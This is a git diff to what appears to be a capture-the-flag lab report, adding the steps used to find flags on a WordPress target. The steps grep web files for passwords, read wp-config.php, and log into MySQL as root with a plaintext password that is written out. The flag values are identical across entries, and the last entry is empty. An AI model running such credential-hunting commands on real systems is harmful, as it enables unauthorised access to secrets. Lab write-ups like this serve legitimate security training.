@@ -59,5 +59,24 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
 
   - `flag2.txt`: fc3fd58dcdad9ab23faca6e9a3e581c
     - **Exploit Used**
-      - _TODO: Identify the exploit used_
-      - _TODO: Include the command run_
+      - Search for Flag2 in /var/www
+      - cd /var/www
+      - grep -rnw ./ -e 'flag2' 2>/dev/null
+      - ![flag2](/Images/Flag2.PNG)
+
+  - `flag3.txt`: fc3fd58dcdad9ab23faca6e9a3e581c
+    - **Exploit Used**
+      - Find plain text password my MySQL database
+        - grep -rnw ./ -e 'password' 2>/dev/null
+        - nano /var/www/html/wordpress/wp-config.php
+        - ![PlaintextPW](/Images/PlaintextPW.PNG)
+      - Access and search MySQL database for usernames and passwords
+        - mysql -u root -p'R@3nSecurity'
+        - ![My1](/Images/Mysql1.png)
+        - ![My2](/Images/Mysql2.png)
+        - select post_content from wp_posts
+        - ![My3](/Images/Mysql3.png)
+
+  - `flag4.txt`: fc3fd58dcdad9ab23faca6e9a3e581c
+    - **Exploit Used**
+      - 
